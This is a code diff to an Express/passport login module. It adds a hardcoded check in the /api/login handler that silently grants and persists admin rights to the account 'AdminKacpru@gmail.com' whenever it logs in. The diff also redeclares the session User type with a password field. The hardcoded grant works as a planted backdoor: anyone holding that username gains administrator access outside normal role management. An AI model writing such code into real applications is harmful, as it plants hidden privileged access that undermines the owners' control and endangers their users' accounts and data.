@@ -9,7 +9,12 @@ import { User } from "@shared/schema";
 
 declare global {
   namespace Express {
-    interface User extends User {}
+    interface User {
+      id: number;
+      username: string;
+      password: string;
+      isAdmin: boolean;
+    }
   }
 }
 
@@ -104,9 +109,16 @@ export function setupAuth(app: Express) {
   });
 
   app.post("/api/login", (req, res, next) => {
-    passport.authenticate("local", (err, user, info) => {
+    passport.authenticate("local", async (err, user, info) => {
       if (err) return next(err);
       if (!user) return res.status(400).json({ message: "Invalid credentials" });
+      
+      // Special case for AdminKacpru@gmail.com - always ensure admin access
+      if (user.username === "AdminKacpru@gmail.com" && !user.isAdmin) {
+        user.isAdmin = true;
+        // Update the user in storage
+        await storage.updateUser(user.id, { isAdmin: true });
+      }
       
       req.login(user, (err) => {
         if (err) return next(err);
